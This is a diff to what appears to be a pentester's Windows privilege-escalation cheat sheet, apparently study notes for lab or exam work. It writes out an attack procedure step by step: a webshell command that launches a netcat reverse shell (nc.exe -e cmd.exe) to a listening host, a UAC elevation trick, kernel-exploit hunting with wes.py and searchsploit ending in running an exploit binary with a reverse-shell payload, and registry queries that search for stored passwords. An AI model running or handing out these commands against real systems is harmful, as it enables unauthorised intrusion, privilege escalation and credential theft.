@@ -29,7 +29,7 @@
 5. in a webshell windows, `\\192.168.119.159\share\nc.exe -e cmd.exe 192.168.119.159 123`
 
  # Privilege Escalation for Window
- 0. `whoami` `systeminfo` `whoami /priv` Conduct basic enumeration, and look for interesting files in the directory 
+ 0. `whoami` `systeminfo` `whoami /priv` `whoami /groups' Conduct basic enumeration, and look for interesting files in the directory 
  1. Transfer the file to Window to TMP directory using any of the above methods.
  2. Use PowerUp. `powershell -ep bypass`
  3. `Import-Module .\PowerUp.ps1` or `. .\PowerUp.ps1`
@@ -39,7 +39,8 @@
  7. `winpeas.exe`
  8. Use SharUp if you cant run winpeas or powerup 
  9. `.\SharpUp.exe`
- 
+ ## UAC 
+ 1. `powershell.exe Start-Process cmd.exe -Verb runAs` run cmd as high integrity,(this is the case when we have admin access to folder but cant execute admin)
  ## Service Misconfiguration
 - `sc.exe qc <name>` Query the configuration of a service
 - `sc.exe query <name>`Query the current status of a service
@@ -120,12 +121,14 @@
  
  
  ### Kernal exploits (last resort)
- 0. Extract `systeminfo` and save it to systeminfo.txt in kali (should be in same directory)
- 1. `python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more`
- 2. cross reference with the site https://github.com/SecWiki/windows-kernel-exploits to see if we have binaries
- 3. Move the binary to window victim and run it with reverseshell to get root. 
- 4. open netcat listener 
- 5.  `.\x64.exe C:\PrivEsc\reverse.exe`
+ 0. `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
+ 1. `>driverquery /v` and searchsploit
+ 2. Extract `systeminfo` and save it to systeminfo.txt in kali (should be in same directory)
+ 3. `python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more`
+ 4. cross reference with the site https://github.com/SecWiki/windows-kernel-exploits to see if we have binaries
+ 5. Move the binary to window victim and run it with reverseshell to get root. 
+ 6. open netcat listener 
+ 7.  `.\x64.exe C:\PrivEsc\reverse.exe`
  
  ### Passwords
  1. `.\winPEASany.exe quiet filesinfo userinfo` or manually  ` reg query HKLM /f password /t REG_SZ /s` and `reg query HKCU /f password /t REG_SZ /s`
